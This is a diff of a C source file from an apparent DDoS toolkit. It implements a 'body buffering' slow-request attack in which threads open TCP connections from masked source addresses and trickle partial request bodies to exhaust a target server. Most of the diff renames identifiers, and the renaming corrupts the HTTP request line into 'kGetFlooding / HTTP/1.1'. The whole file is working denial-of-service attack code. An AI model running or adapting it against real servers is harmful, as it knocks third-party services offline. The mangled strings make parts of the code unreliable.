@@ -5,8 +5,8 @@
 #include "base/time_check.h"
 #include "ddos/body_buffering.h"
 
-#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-#define BODY_BUFFERING_CNT 2000
+#define kGetFlooding_METHOD "kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define kBodyBuffering_BUFFERING_CNT 2000
 
 extern int g_num_threads;
 
@@ -25,7 +25,7 @@ pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_bodybuf_before_time;
 struct timespec g_bodybuf_now_time;
 
-void body_buffering_print_usage(void)
+void BodyBufferingPrintUsage(void)
 {
 	printf(
 			"body buffering Usage : "
@@ -33,21 +33,21 @@ void body_buffering_print_usage(void)
 	return;
 }
 
-void *generate_body_buffering(void *data)
+void *GenerateBodyBuffering(void *data)
 {
 	int thread_id = *((int*) data);
 	// make tcp connection
 	int sock = -1;
 	// for data transfer
 	int src_port, seq, ack;
-	int body_buffering_cnt = 0;
+	int bodybuf_cnt = 0;
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_bodybuf_mutex);
-		get_masking_arguments(&g_bodybuf_input, &g_bodybuf_now);
-		if (body_buffering_cnt % BODY_BUFFERING_CNT == 0) {
+		GetMaskingArguments(&g_bodybuf_input, &g_bodybuf_now);
+		if (bodybuf_cnt % kBodyBuffering_BUFFERING_CNT == 0) {
 			if(sock!=-1) close(sock);
-			sock = tcp_make_connection(
+			sock = MakeTcpConnection(
 					inet_addr(g_bodybuf_now.src),
 					inet_addr(g_bodybuf_now.dest),
 					&src_port,
@@ -55,25 +55,25 @@ void *generate_body_buffering(void *data)
 					&seq,
 					&ack,
 					0);
-			tcp_socket_send_data(
+			TcpSocketSendData(
 					sock,
 					inet_addr(g_bodybuf_now.src),
 					inet_addr(g_bodybuf_now.dest),
 					src_port,
 					g_bodybuf_now.port,
-					GET_METHOD,
-					strlen(GET_METHOD),
+					kGetFlooding_METHOD,
+					strlen(kGetFlooding_METHOD),
 					seq, ack, 0);
-			seq += strlen(GET_METHOD);
+			seq += strlen(kGetFlooding_METHOD);
 
-			body_buffering_cnt = 0;
+			bodybuf_cnt = 0;
 		}
 		// wait a second
 		if (g_bodybuf_num_generated_in_sec >= g_bodybuf_request_per_sec) {
 			pthread_cond_wait(&g_bodybuf_cond, &g_bodybuf_mutex);
 		}
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_bodybuf_cond,
 				&g_bodybuf_before_time,
 				&g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
@@ -81,7 +81,7 @@ void *generate_body_buffering(void *data)
 		char data[] = "a\r\n";
 
 
-		tcp_socket_send_data_no_ack(
+		TckSocketSendDataWithoutAck(
 				sock,
 				inet_addr(g_bodybuf_now.src),
 				inet_addr(g_bodybuf_now.dest),
@@ -96,7 +96,7 @@ void *generate_body_buffering(void *data)
 
 		g_bodybuf_num_generated_in_sec++;
 		g_bodybuf_num_total++;
-		body_buffering_cnt++;
+		bodybuf_cnt++;
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_bodybuf_mutex);
 	}
@@ -104,11 +104,11 @@ void *generate_body_buffering(void *data)
 	return NULL;
 }
 
-void *body_buffering_time_check(void *data)
+void *BodyBufferingTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_bodybuf_mutex);
-		time_check(
+		TimeCheck(
 				&g_bodybuf_cond,
 				&g_bodybuf_before_time,
 				&g_bodybuf_now_time,
@@ -118,17 +118,17 @@ void *body_buffering_time_check(void *data)
 	return NULL;
 }
 
-void body_buffering_main(char *argv[])
+void BodyBufferingMain(char *argv[])
 {
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 	if (argc != 4) {
-		body_buffering_print_usage();
+		BodyBufferingPrintUsage();
 		return;
 	}
-	argv_to_input_arguments(argv, &g_bodybuf_input);
+	ArgvToInputArguments(argv, &g_bodybuf_input);
 	g_bodybuf_num_generated_in_sec = 0;
 	g_bodybuf_num_total = 0;
 	memset(&g_bodybuf_before_time, 0, sizeof(struct timespec));
@@ -148,10 +148,10 @@ void body_buffering_main(char *argv[])
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_body_buffering,
+				GenerateBodyBuffering,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, body_buffering_time_check, NULL);
+	pthread_create(&threads[i], NULL, BodyBufferingTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("threads %d joined\n", i);
@@ -159,7 +159,7 @@ void body_buffering_main(char *argv[])
 	printf("Body Buffering attack finished.\n");
 	pthread_mutex_destroy(&g_bodybuf_mutex);
 	pthread_exit(NULL);
-	printf("UDP flood finished\nTotal %lu packets sent.\n",
+	printf("kUdpFlooding flood finished\nTotal %lu packets sent.\n",
 			g_bodybuf_num_total);
 	return;
 }
